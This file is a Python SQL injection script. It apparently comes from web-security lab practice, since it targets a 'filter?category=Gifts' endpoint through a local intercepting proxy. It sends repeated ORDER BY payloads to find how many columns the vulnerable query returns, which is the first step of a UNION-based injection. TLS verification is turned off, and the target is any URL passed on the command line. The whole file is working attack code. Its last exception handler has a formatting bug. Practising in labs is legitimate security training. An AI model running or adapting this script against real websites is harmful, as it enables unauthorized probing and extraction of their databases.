import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def exploit_sqli_column_number(url):
    path = "filter?category=Gifts"
    for number in range(1,50):
        payload = "'+order+by+%s--" %number
        response = requests.get(
            url + path + payload,
            verify=False,
            proxies=proxies)
        if "Internal Server Error" in response.text:
            return number - 1
    raise  ValueError("Max number of tries exceeded, 50")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        print("[+] Figuring out number of columns...")
        num_col = exploit_sqli_column_number(url)
        print("[+] The number of columns is " + str(num_col) + "." )
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    except Exception as exception:
        print("An exception occured" % exception)
        print("[-] The SQLi attack was not successful.")
        sys.exit(-1)